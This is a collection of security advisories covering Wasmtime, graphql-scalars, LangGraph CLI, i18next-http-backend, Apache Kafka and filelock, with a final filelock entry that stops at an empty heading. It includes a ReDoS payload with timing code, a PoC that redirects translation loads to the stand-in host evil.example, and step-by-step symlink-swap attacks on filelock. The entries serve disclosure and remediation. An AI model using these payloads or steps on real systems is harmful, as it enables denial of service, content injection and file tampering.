Wasmtime: Cranelift backend on aarch64 can jump to incorrect target on large Wasm `br_table` instruction
desc:
## Summary

When running with the Cranelift compiler backend on an aarch64 target, Wasmtime can compile a Wasm module with more than ~256k targets on one `br_table` instruction in a way that results in an incorrect conditional branch target. This conditional branch could then jump to arbitrary other code (at an user-controlled offset), leading to arbitrary sandbox escapes.

## Impact

Any Wasmtime engine running on aarch64 with default settings can be forced to jump to arbitrary code by a user-controlled Wasm module. All versions of Wasmtime/Cranelift that support aarch64, since the initial release of that support in 2020 (before Wasmtime v1.0), are affected.

## Patches

Wasmtime v36.0.19, v48.0.7, and v49.0.4 have been released which all fix this issue.

title: graphql-scalars PhoneNumber scalar is vulnerable to regular expression denial of service
desc:
## Summary

The regular expression behind `GraphQLPhoneNumber` since 1.24.1 backtracks exponentially. A string made of a run of digits followed by one character that makes the match fail (for example `"1".repeat(30) + "x"`) blocks the JavaScript thread for seconds, and every additional digit doubles the time.

graphql-js calls `parseLiteral` while *validating* a document and `parseValue` while coercing variables, so the regex runs for every request that merely contains such a value in a `PhoneNumber` position, before execution and before any authentication or authorization step of the server. One small unauthenticated request is enough to stall a server process.

## Affected versions

- `graphql-scalars` >= 1.24.1, <= 2.0.0 (2.0.0 is the current `latest`; the default branch still has the same pattern).
- Not affected: 1.24.0 and the earlier versions I checked (1.22.4, 1.23.0), which use the linear `/^\+[1-9]\d{6,14}$/`.
- Introduced by #2719 (c7f58da16, "PhoneNumber scalar is not fully compatible with E.164 format so updated regex to support phone number with extension"), released as 1.24.1 on 2025-01-29.

The payload was ran against 1.22.4, 1.23.0, 1.24.0, 1.24.1, 1.24.2, 1.25.0, 1.26.0 and 2.0.0: the first three reject it instantly, the other five show the exponential growth.

## Root cause

`src/scalars/PhoneNumber.ts`:

```js
const PHONE_NUMBER_REGEX = /^\+?\d{1,3}(\-|\x20)?\(?\d+\)?((\-|\x20)?\d+)+$/;
```

In `\d+\)?((\-|\x20)?\d+)+$` the separator is optional, so a run of n digits can be split across the inner `\d+` and the outer `+` iterations in a number of ways that is exponential in n. When the overall match fails, for instance on a trailing non-digit, the engine tries all of them.

## Proof of concept

1. The scalar alone (`npm i graphql graphql-scalars@2.0.0`):

```js
import { GraphQLPhoneNumber } from 'graphql-scalars';

for (const ok of ['+41791234567', '079 123 45 67', '+1 (123) 456-7890', 'nope']) {
  try { GraphQLPhoneNumber.parseValue(ok); } catch {}
}
for (const digits of [24, 26, 28, 30]) {
  const start = performance.now();
  try { GraphQLPhoneNumber.parseValue('1'.repeat(digits) + 'x'); } catch {}
  console.log(`${digits} digits: ${((performance.now() - start) / 1000).toFixed(2)} s`);
}
```

Measured warm, i.e. after ordinary inputs have been validated like in a running server:

| digits | Node 22.19.0 | Node 26.10.0 |
|-------:|-------------:|-------------:|
| 24 | 0.10 s | 0.07 s |
| 26 | 0.41 s | 0.29 s |
| 28 | 1.63 s | 1.14 s |
| 30 | 6.59 s | 4.62 s |

The time doubles with every digit. The first execution of the regex in a fresh process is about 5x slower because V8 interprets a regexp on its first run (Node 22.19.0, 28 digits: 7.8 s).

2. Through graphql-js, no server and no authentication: a schema with a single `echo(phone: PhoneNumber)` field, 26 digits + `x`, Node 22.19.0, warm:

| | literal (`parseLiteral`, validation) | variable (`parseValue`, coercion) |
|---|---:|---:|
| graphql 16.14.2 | 0.41 s | 0.43 s |
| graphql 17.0.2 | 0.41 s | 0.83 s (evaluated twice) |

3. Also reproduced end to end against a GraphQL Yoga server: an anonymous HTTP request with a 27-digit value plus one invalid character stalled the whole process (a concurrent trivial `{ __typename }` request waited as long). A mutation that requires authentication was affected equally when called anonymously, because document validation runs before any authorization in resolvers or context.

## Impact

Denial of service. Any GraphQL server that exposes `PhoneNumber` on an argument, an input object field or a variable can be stalled by a request of about 30 characters; roughly 40 characters would keep a process busy for hours (extrapolated from the doubling, not measured). `serialize` uses the same regex, so unvalidated stored values returned through a `PhoneNumber` field are affected too. The actual severity depends on the scalar being applied to untrusted input, which is the typical case.

## Suggested fix

An equivalent pattern without ambiguous splits:

```js
const PHONE_NUMBER_REGEX = /^\+?\d{1,3}[- ]?\(?\d(?:\d*\))?(?:[- ]?\d)+$/;
```

It accepts exactly the same strings as the current one, so there is no behaviour change: with `N = (S?\d+)+ = (S?\d)+` a digit run is just repeated single-digit iterations, hence `\d+\)?N = \d(\d*\))?N`. Verification:

- exhaustive comparison of old and new pattern on every string up to length 9 over `1 + - space ( ) x`: 47,079,208 strings (1,832 accepted), 0 differences;
- every sequence of up to 6 tokens from `1 11 111 1111 11111 + - space ( ) x`: 1,948,717 strings (100,380 accepted), 0 differences;
- adversarial inputs (digit runs plus a failing character, digit/space and digit/dash alternations, parenthesis variants) scale linearly: 1,000,000 characters take about 10 ms, where the current pattern needs 0.3 s for 26.

Optionally also reject values above a sane length before matching; the grammar currently has no upper bound and E.164 allows at most 15 digits. Above roughly 10 million characters V8 aborts the match with a `RangeError` (stack) after about 25 ms instead of returning false.

A regression test that fails with the current implementation: `GraphQLPhoneNumber.parseValue('1'.repeat(40) + 'x')` must throw its validation error immediately; with the current pattern it does not return in any reasonable time.

## Workarounds for users until a fix is released

- Replace the scalar in the schema with one that uses the pattern above.
- Run Node with `--enable-experimental-regexp-engine-on-excessive-backtracks`, or call `v8.setFlagsFromString('--enable-experimental-regexp-engine-on-excessive-backtracks')` before the regex first runs. V8 then falls back to its linear-time engine after excessive backtracking; verified on Node 22.19, 24.15 and 26.10. The flag is not accepted in `NODE_OPTIONS`.
- Pinning `graphql-scalars` to <= 1.24.0 restores a linear pattern but changes which values are accepted (only `+` prefixed E.164).

## Coordination

We have not disclosed this publicly. We maintain Unchained Engine (`@unchainedshop/api`), a downstream project that exposes this scalar on public input fields and will need to ship a mitigation of its own, so we would like to coordinate the timing of any public disclosure with you. Please let us know your preferred timeline, and whether you would like us to prepare a pull request (we can work in a temporary private fork if you enable one).

title: LangGraph CLI prints the registry push token in `langgraph deploy --verbose` output
desc:
### Summary

`langgraph deploy --verbose` printed the temporary registry push token that the CLI uses to log Docker in to the deployment's image registry. Anyone who could read that output, for example in CI logs, could use the token until it expired.

### Details

When Docker is available, `langgraph deploy` builds the image locally, requests a push token from LangSmith, and runs `docker login --password-stdin` with the token on stdin. The CLI's subprocess helper printed each command's stdin when verbose output was on, and the login step inherited `--verbose`, so the token was printed right after the `docker login` command line.

`langgraph-cli` 0.4.15 through 0.4.31 are affected. Starting with 0.4.32, the login step runs without verbose output. Deploys run without `--verbose`, and deploys that build the image remotely, never printed the token.

### Impact

You may be affected if you ran `langgraph deploy --verbose` with an affected version and the output was kept or shared, for example in CI logs or terminal recordings. The token is short-lived (at most 12 hours) and limited to that deployment's image repository. Someone holding it before it expired could pull the deployment's images and push new images to that repository. Deployments reference their image by digest, so a pushed image does not run unless the deployment is updated to use it, which requires a LangSmith API key with access to the deployment.

### Remediation

Upgrade to `langgraph-cli` 0.4.32 or later. 0.4.37 also stops `--verbose` from printing the input of any command the CLI runs. Tokens printed more than 12 hours ago have expired.

title: i18next-http-backend: Namespace value starting with / forms a protocol-relative URL when loadPath/addPath places {{ns}} right after a / (bypass of the // check added for…
desc:
## Affected versions
Verified on 4.0.2 (latest on npm) and on commit 07e0288 (the GHSA-xvq9-wjp8-hwqf fix). Earlier 3.x/4.x versions that allow `/` in ns are likely affected too. Not verified on them.

## Impact
Same class as GHSA-xvq9-wjp8-hwqf and GHSA-q89c-q3h5-w34g: when an attacker controls the namespace value, the request goes to an attacker-chosen origin. In a browser this loads attacker-controlled translation JSON (content injection into the UI, and XSS where translations are rendered as HTML). The precondition is a template with `{{ns}}` right after a leading `/`, for example `/{{ns}}/{{lng}}.json`. The 4.0.2 maintainer note says templates with a leading `/` are safe. This case is outside that statement.

## Root cause
`isSafeNsUrlSegment` rejects any ns containing `//`, but allows a single leading `/` (needed for nested namespaces like `a/b`). Interpolation into `/{{ns}}/...` puts the template's own `/` next to the value's `/`. The result starts with `//`, which is a protocol-relative URL. The check runs on the value, not on the final URL.

## Minimal PoC
```js
import Backend from 'i18next-http-backend'
const b = new Backend(null, { loadPath: '/{{ns}}/{{lng}}.json',
  request: (opts, url, payload, cb) => { console.log(url, '->', new URL(url, 'https://app.example/').origin); cb(null, { status: 200, data: '{}' }) } })
b.read('en', '/evil.example', () => {})
```
Observed on 4.0.2:
```
POC ns=/evil.example  loadPath=/{{ns}}/{{lng}}.json => url=//evil.example/en.json  origin in page https://app.example/ = https://evil.example
```

## Negative controls (same run)
- ns `//evil.example`: rejected ("unsafe lng/ns value").
- lng `http:127.0.0.1:9` (the GHSA-xvq9 payload): rejected.
- ns `common` and nested ns `a/b`: `common/en.json` and `a/b/en.json`, same origin.

## Suggested fix
Validate the final interpolated URL, not just the values: reject it if it starts with `//` or `\`, or if it has a scheme or host the template did not have. The advisory already recommends this ("parse the final URL and require it to remain within the intended origin and path"). Alternatively, reject an ns that starts with `/`.

## Disclosure
We intend to keep this private for 90 days from the date of the report, or until a fixed release is available, whichever comes first, and are happy to adjust if you need more time.

## Re-verification
Re-run on 2026-10-14 against the same latest release. The PoC still reproduces and the negative controls still hold.

Reported by Zachariah Mithani.

## Maintainer note

Confirmed and fixed in 4.0.3 (commit i18next/i18next-http-backend@042c3d4).

**Preconditions.** The `loadPath` / `addPath` template must put `{{ns}}` directly after a leading `/` (for example `/{{ns}}/{{lng}}.json`), and the attacker must control the namespace value. Applications usually set namespaces in code rather than from user input. The default `/locales/{{lng}}/{{ns}}.json`, templates with an origin, and templates with a fixed path segment before `{{ns}}` are not affected. Only browsers are affected: in Node, `fetch('//host/...')` fails because there is no base URL to resolve against. XSS additionally requires the application to render translations as HTML.

**Fix.** The 4.0.2 `//` check looked at each value on its own and could not see the `/` the template puts in front of it. `interpolateUrl` now also checks the interpolated URL: it may only start with `//` or `\` if the template itself does. Protocol-relative CDN templates such as `//cdn.example/{{lng}}/{{ns}}.json` keep working.

**Affected range.** Versions before 3.0.5 had no value validation at all and are reachable through this vector too, so the affected range is `< 4.0.3`.

**Related.** i18next-fs-backend had the same class of problem for file paths (a leading `/` in `ns`, or `C:` in `lng`, changing the root of a path built from a template that starts with the placeholder). It is fixed in i18next-fs-backend 2.6.9.

title: Apache Kafka Connect contains an authentication bypass vulnerability affecting the admin REST API when admin.listeners is configured with a separate listener from the main…
desc:
Apache Kafka Connect contains an authentication bypass vulnerability affecting the admin REST API when admin.listeners is configured with a separate listener from the main listeners property.

When operators isolate the admin REST API by explicitly configuring the "admin.listeners" property, REST extensions specified via rest.extension.classes (such as BasicAuthSecurityRestExtension) are not registered or applied to the admin resource configuration.

While the primary REST API listener (configured via listeners) enforces configured authentication and authorization filters, endpoints mounted under the separate admin listener (/admin/loggers) fail to inherit or instantiate these extension filters. As a result, the admin logger endpoint accepts unauthenticated read and write requests even when security extensions are active on the main listener.

Impact:

An unauthenticated attacker with network access to the admin listener can:

  1. Read the complete set of logger names and levels, disclosing loaded class names and which security extensions are in use.
  2. Write logger levels, including with scope=cluster which propagates the change to all workers in the Connect cluster. This can be used to suppress
     logging (setting root to OFF) or generate excessive log output (setting root to TRACE), potentially impacting availability and observability.

Mitigation:

  Users who cannot upgrade immediately can remove the admin.listeners configuration (or leave it unset). When unset, admin resources share the regular listener and inherit its security extensions.

Resolution:


From Apache Kafka 4.2.2, 4.3.2, and 4.4.0, we make sure the REST extensions specified via "rest.extension.classes" will also apply to "admin.listeners".

title: When a broker decodes a compressed record batch, the per-record decoder reads a declared body size from the decompressed stream and allocates a buffer of that size before…
desc:
When a broker decodes a compressed record batch, the per-record decoder reads a declared body size from the decompressed stream and allocates a buffer of that size before validating it against the bytes available or any configured limit. The size is attacker-controlled, and the batch CRC does not constrain it, so a small (around 90-byte), CRC-valid compressed produce request can declare a body size of up to about 2 GiB and force the broker to attempt that allocation, raising OutOfMemoryError. The record size limit (max.message.bytes), the request size limit, and client/broker quotas bound only the compressed wire size, not the declared decompressed size.


Impact:

An authenticated principal with Write on a topic can crash broker request-handler threads (reached when a batch's codec differs from the topic's compression.type and records are re-encoded) and any consumer that fetches the record, denying service. On brokers started with -XX:+ExitOnOutOfMemoryError, a common hardening, a single crafted request terminates the broker JVM. More seriously, a crafted record  is accepted at ingest and written to disk; when the log-cleaner later reads it on a compacted topic, the OutOfMemoryError (an Error, not an Exception) terminates the cleaner thread, which is not restarted. With the default of a single cleaner thread, log compaction then stops for the entire broker, including the internal __consumer_offsets and __transaction_state topics, and the condition persists across restarts until the offending record is removed. The impact is availability only; no data is disclosed or altered.


Mitigation:

Upgrade to Apache Kafka 4.2.2, 4.3.2, or 4.4.0, and set max.decompressed.message.bytes (at the broker and/or topic level) to a bounded value appropriate for your workload. Upgrading alone is not sufficient: for backward compatibility this configuration defaults to an effectively unlimited value (about 2 GiB), so a broker remains exposed until the limit is set. Choose a value at or slightly above the largest legitimate decompressed record your applications produce, and comfortably below the broker heap divided by the number of request-handler and cleaner threads. Until you can upgrade and configure the limit, restrict Write access to trusted producers; quotas and max.message.bytes do not mitigate this issue.


Resolution:

From Apache Kafka 4.2.2, 4.3.2, and 4.4.0: the broker validates a record's declared decompressed body size against max.decompressed.message.bytes before allocating, on the produce-validation, log-compaction, and timestamp-lookup paths, and rejects oversized or negative sizes with InvalidRecordException. Operators must set this configuration to a bounded value to be protected, as its default is effectively unlimited.

title: filelock: SoftReadWriteLock follows a lock tree swapped in after its first acquire and writes lock records into directories of the user running the lock
desc:
`SoftReadWriteLock` (and `AsyncSoftReadWriteLock`, which wraps one) checks once per lock object, by name, that `<path>.rw`, `<path>.rw/gen` and `<path>.rw/holders` are real directories and not symbolic links (files that redirect to another path). It then keeps only a boolean. Every later record operation resolves the full path again, and `O_NOFOLLOW` (a flag that makes an open fail when the final name is a symbolic link) protects the last component only. Another local user (the other user below) who can write the directory holding the lock, or who created `<path>.rw` first in a sticky directory such as `/tmp` (the sticky bit is a directory flag that lets only a file's owner rename or remove it), can put a tree under that name whose `gen` or `holders` is a symbolic link into a directory of the user running the lock (the lock user below).

A long-running process of the lock user that has already passed the check then creates, renames over and deletes files there with the lock user's privileges, including in `0700` directories the other user cannot open. The names and bytes are filelock's own lock records, not chosen by the other user. The scanner's reproducer replaces `.git/HEAD` in the lock user's private repository so that `git status` fails. There is no race. Affected versions: filelock >= 4.1.0 and <= 4.2.0. Anthropic's OSS Scanner reported it in private as `ANT-2026-WXXRI4M4` [high, CWE-367], titled "SoftReadWriteLock follows gen dir swapped for a symlink after first acquire".

## Severity

**CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N, 3.3 (Low).**

`AV:L` (local): the other user needs an account on the same host. `AC:L` (low attack complexity): the swap happens between two acquisitions, with no race to win. `PR:L` (low privileges): a local user with ordinary privileges is enough. `UI:N` (no user interaction): the lock user's process acts on its own. `C:N` (no confidentiality impact): the other user learns nothing. `I:L` (low integrity impact): the lock user's process replaces a file named `HEAD`, creates `epoch` and generation records, and deletes files whose names match the protocol's patterns, in any directory the lock user can write, with the lock user's privileges. The other user does not choose the bytes, but the files are gone and the chosen directory (a git repository) stops working. `A:N` (no availability impact): the lock itself keeps working and the lock user's process does not stall. The scanner rated it high; we scored the vector for a lock user with ordinary privileges.

Classification from the external review: conditional security. It is a cross-user replacement of a cached `.rw` tree that redirects later writes of the lock user through an intermediate symbolic link. It needs a planted tree in sticky `/tmp` or a writable parent without the sticky bit. Scoring note: we rate integrity low rather than high. The bytes written through the swapped tree are filelock's own records, not content the other user chose, so the lower reading of the CVSS integrity metric applies.

## Scope and preconditions

- Trust boundary: the other party is a different local account with write access to the lock's parent directory. Without the sticky bit (a `0777` scratch or spool directory, or a group-writable project or cache directory shared with that account's group) write access alone is enough. The other user renames the lock user's own `0700` `<path>.rw` aside and puts its tree in place. In a sticky parent such as `/tmp` the extra precondition is that it created `<path>.rw` (with real `gen` and `holders` directories, mode `0777`) before the lock user's first acquire. `prepare()` accepts an existing tree whoever owns it, and the other user later replaces its own `gen` with a symbolic link. `fs.protected_symlinks=1` (a Linux setting that refuses to follow another user's symbolic link in a world-writable sticky directory) does not intervene, because the link sits inside the other user's own non-sticky `<path>.rw`, not in the sticky parent (the scanner ran with that setting).
- Lock user: any process that keeps one `SoftReadWriteLock` or `AsyncSoftReadWriteLock` object (a singleton per path by default) and acquires it more than once, or is waiting for it when the swap happens. A fresh process that meets the planted tree gets `RuntimeError`. Between two acquisitions there is no timing to win.
- Targets: any directory the lock user can write, on any filesystem. The other user needs only to know its path (`/home/victim/project/.git` in the reproducer, under a `0700` home directory the other user cannot open).
- Platform: observed on Linux. The code path is the same on every POSIX platform and on Windows, where a junction (a Windows directory that points at another directory) at a directory component plays the symbolic link's part. The scanner ran Linux only.
- Ancestor boundary: protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.

## Affected code

At the scanned commit `b831496b0273`, [`OsFiles.prepare` checks the three directories with `lstat` and caches `_prepared`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L121-L133). `lstat` reports what a name is without following a symbolic link. Every later operation takes a full path string, for example [`create`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L53-L60) (`O_NOFOLLOW` on the last component only), [`replace`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L86-L92) (`Path(source).replace(target)`), [`unlink`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L104-L112) and [`listdir`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L114-L119). The callers that write through the swapped tree are [`Participant.publish` / `_create_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L435-L445), [`GenerationLog._incarnation`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L282-L295) (creates `epoch`), [`commit`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L344-L360) (links a generation record and renames over `HEAD`), [`_keep_claim_fresh`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L487-L496), [`_sweep`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L498) and [`_list`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L297) (unlink). There is one `OsFiles` per lock object ([`_sync.py` line 204](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_sync.py#L204)), handed to every `Participant` at [line 501](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_sync.py#L501).

## Introduced

The once-per-object shortcut (`_prepared`) came with `367b111` ("fix(soft-rw): publish the head through gen/HEAD (#799)", 2026-10-08), first released in 4.1.0 (verified with `git tag --contains 367b111`, which answers 4.1.0). That commit opens the route between two acquisitions with no timing to win. The check-then-use gap itself is older. At its parent `61582c5` (also first in 4.1.0) a contender already waiting during the swap still creates `epoch` in the target before the lock refuses it, while 4.0.0 leaves the target untouched in the same test. The group advisory carried `>= 4.0.0` as the union with a sibling finding; for this finding alone the range is `>= 4.1.0, <= 4.2.0`.

## Mechanism

`prepare()` runs `mkdir(mode=0o700)` and then `lstat()` on each of `<path>.rw`, `gen` and `holders`. It raises `RuntimeError("... exists but is not a directory or is a symlink; refusing to use it")` for a symbolic link or non-directory. It does this by name, once per `OsFiles` (`if self._prepared and not force: return`), and only a `FileNotFoundError` while creating the holder record (the file that says this process holds or wants the lock) leads to `prepare(force=True)`. All other `OsFiles` methods (`read`, `create`, `link`, `replace`, `overwrite`, `unlink`, `listdir`) take a full path string such as `/srv/shared/app.lock.rw/gen/HEAD`. `O_NOFOLLOW` applies to `HEAD`, and the kernel follows `app.lock.rw` and `gen` to whatever they name at that moment. The gap between the check and a use is therefore as long as the process keeps the lock object.

The scanner observed this at the scanned commit on Linux 6.1, CPython 3.14.8, overlayfs, with a default-options `SoftReadWriteLock`, as two accounts in `/srv/shared` (root-owned, mode `0777`, no sticky bit):

1. `victim` runs a worker that builds `SoftReadWriteLock("/srv/shared/app.lock")` once and takes `write_lock()` for each job. After the first job, `app.lock.rw` exists, owned by `victim`, mode `0700`.
2. `attacker` renames `app.lock.rw` to `app.lock.rw.aside`, creates a new `app.lock.rw` with a world-writable `holders/` in it, and makes `app.lock.rw/gen` a symbolic link to `/home/victim/project/.git`. `/home/victim/project` is mode `0700`; the `attacker` account cannot open anything below it.
3. The worker takes the lock for its second job. `write_lock()` returns without error. `/home/victim/project/.git` now holds new files `epoch`, `00000000000000000001` and `00000000000000000002`, and `<epoch>\nfilelock-rw/1\ngeneration=2\n` has replaced the content of `.git/HEAD`. `git status` there answers `fatal: not a git repository`.

The second acquisition, step by step: `Participant.publish()` calls `prepare()`, which returns at once, then creates `holders/<token>`. The planted tree has a writable `holders`, so this succeeds. `advance()` calls `GenerationLog.latest()` (the generation log is the lock's ordered record of write generations under `gen/`). `_incarnation()` reads `gen/epoch`, finds none behind the link, and creates `.git/epoch`. The epoch differs from the remembered one, so the code drops the remembered log. git's `HEAD` does not start with the new epoch, so `_head_record()` ignores it and the log reads as empty. `commit()` creates `.git/.commit-<token>`, hard-links it (a hard link is a second name for the same file) to `.git/00000000000000000001`, removes the temporary name, and publishes `HEAD` through `OsFiles.replace`, which is `rename(".git/.commit-<token>", ".git/HEAD")`. The release commits generation 2 the same way and renames over `HEAD` again.

Other ways into the same gap exist. The scanner ran each at this commit with a directory only the lock user can access as the link target. A contender already waiting when the swap happens recreates its missing holder record in the planted `holders/` on its next poll (`_keep_claim_fresh()`), and the commit that follows replaces `HEAD` in the target. A process that only holds and releases, with the tree swapped during the hold, creates `epoch` in the target on release. With `holders` as the link, `Participant._sweep()` (run on acquire polls and from a holder's `heartbeat()`) unlinks files in the target whose names are 32 lowercase hex digits once the lock object has seen them unchanged for `stale_threshold` (observed with `stale_threshold=2`; the default is 90 s). With `gen` as the link, `GenerationLog._list()` unlinks every 20-digit name except the 64 highest: of 70 such files, it removes the 6 lowest before the acquire fails with `SoftFileLockProtocolError`.

## Evidence

The scanner's reproducer runs as root, drops to `victim` and `attacker` through `runuser`, needs `git`, changes no sysctl, and takes about half a second. It creates `/srv/shared` (root-owned, `0777`, no sticky bit), has `victim` run `git init /home/victim/project` and makes that directory `0700`. It then drives two programs. `victim_worker.py` holds one `SoftReadWriteLock("/srv/shared/app.lock")` with default options; for each line on stdin it takes `write_lock(timeout=30)`, releases it and prints `finished <job> and released the lock`. `attacker_swap_tree.py` renames the lock user's `app.lock.rw` aside, creates a new one with a world-writable `holders/`, and makes `app.lock.rw/gen` a symbolic link to `/home/victim/project/.git`, using only write access to `/srv/shared`. On the scanned commit it prints:

```

VICTIM   victim: finished job 1 and released the lock
VICTIM   app.lock.rw owner uid 1000 mode 0o700

The `CONTROL` lines show that the other account cannot reach the repository itself and that a fresh lock object refuses the planted tree. The existing check works; the code does not repeat it for a live instance. The sticky-directory variant ends the same way, with `fs.protected_symlinks=1`. There the other account creates `app.lock.rw`, `gen` and `holders` with mode `0777` in a `1777` parent before the lock user's first acquire, then renames its own `gen` aside and links it to the lock user's `.git`.

Our verification: `BUG` on the scanned commit `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #842 stack head: `OK`, `HEAD` stays `ref: refs/heads/master`, `.git` keeps its original listing and `git status` answers `On branch master`. The result is the same with the stack's owner check disabled, so it does not depend on who owns the tree.

## Impact

With the lock user's privileges, in any directory the lock user can write, the other user gets a file named `HEAD` replaced, new files `epoch`, `HEAD` and 20-digit generation names created (mode `0600`), and files deleted whose names match the protocol's patterns (32 hex digits, 20 digits, `.commit-*`). The bytes written are filelock's own records, not chosen by the other user. Replacing `HEAD` makes a git repository unusable when the other user knows its path. Renaming `<path>.rw` away is something this other user may do anyway, and `docs/how-to.rst` documents the result (a new log starts). What this finding adds is that the lock user's file operations leave the lock's directory.

This is adjacent to GHSA-j8f7-rjxc-mr56 (`ReadWriteLock` following a symbolic link at its database path, fixed in 4.0.9) and the earlier symbolic link fixes (PR 461 for lock file creation, PR 465 for `SoftFileLock`, PR 565 for refreshing soft read/write lock markers). Each guards the final path component. Here the link sits at a directory component, which `O_NOFOLLOW` does not cover.

## Workarounds

- Keep the lock path in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share a `SoftReadWriteLock` between accounts through a `0777` or group-writable directory.
- In a sticky directory such as `/tmp`, make sure the locking account creates `<path>.rw` before anyone else can (for example at install time with mode `0700`), and do not use a lock path whose `<path>.rw` belongs to another account.
- Prefer a fresh lock object per unit of work over a long-lived singleton when other accounts can write the lock directory. A fresh object re-runs the directory check and refuses a planted tree.

title: filelock: SoftFileLock removes a live holder's marker when another user forges the PID in a writable marker
desc:
`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async variants and a `FileLock` that has fallen back to a soft lock on `ENOSYS` decide from the record inside the marker file whether its owner is gone. The marker is the file whose presence says a process holds the lock. They do not check who could have written that record.

A local user who can write the marker but cannot remove it rewrites the holder's record to name a dead PID (process id). That position arises with an explicit `mode` with group or other write bits, or the default mode under a lax umask (the process setting that strips permission bits from new files), in a sticky or otherwise non-removable directory. The sticky bit is a directory flag that lets only a file's owner remove or rename it. The next contender running as the holder's account, or root, judges the lock stale, removes the live marker on that user's behalf and acquires it. Two processes then run the critical section together and neither gets an error. Affected versions are filelock 3.22.0 through 4.2.0 (finding `ANT-2026-W1H9NXUH`).

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` scores 4.7 (Medium).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:H` (high attack complexity): the marker must carry group or other write bits (an explicit permissive `mode`, or umask `002`/`000` with a shared group), and a contender of the holder's account must ask for the lock while the forged record is in place. `I:H` (high integrity impact): two holders then write whatever the lock protects, and the holder is not told. `C:N` and `A:N` (no confidentiality or availability impact). `S:U` (scope unchanged). Classification from the review: **security, conditional** on another user being able to write the live marker. The scanner rated it high (CWE-345). The default mode under umask `022` is not affected.

## Scope and preconditions

- The other user can write the marker. The application passes a `mode` with group or other write bits, which `fchmod` applies as given since 4.1.0. `0o666` is a common choice for a lock shared between accounts, although a soft-lock contender of another account waits as well on a `0o644` marker, since contenders only read and rename. Or the application uses the default mode (`0o666` through the umask) under umask `002` in a directory whose group the other user belongs to, or under umask `000`. The default mode under umask `022` is not affected.
- The other user cannot remove the marker itself: the directory is sticky, or the other user cannot write it at all (a `0755` directory owned by the lock's user gives the same overlap). In a non-sticky shared directory the other user can unlink the marker without filelock, and filelock adds nothing.
- A contender that may rename the marker asks for the lock: another process of the holder's account (several workers of one user) or root. A contender of another unprivileged account cannot rename the marker in a sticky directory and times out.
- The finding reaches every class that publishes a soft marker: `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async variants, and `FileLock(mode=0o666)` on a filesystem where `flock` (a kernel lock on an open file) fails with `ENOSYS`.

These protections against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against.

## Affected code

At the scanned commit b831496: the create mode in [`SoftFileLock._acquire`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L67-L71), the explicit-mode `fchmod` in [`_apply_explicit_mode`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L100-L105), the trusting verdict in [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) and the [`owner_is_stale`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_identity.py#L64-L79) it relies on; the same call in [`MarkerSoftFileLock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81) and [`SoftFileLease`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256).

## Introduced

The stale verdict that trusts the record came in with e35c3afac473 ("feat(soft): detect and break stale locks", #476, 2026-02-13), first released in 3.22.0. From then on a marker left group- or other-writable by the umask is forgeable. The reproducer's exact configuration, an explicit `mode=0o666` under umask `022`, needs 66d309d ("fix(soft): honour mode and tighten marker grammar", #807), first released in 4.1.0. Both match the git tags.

## Mechanism

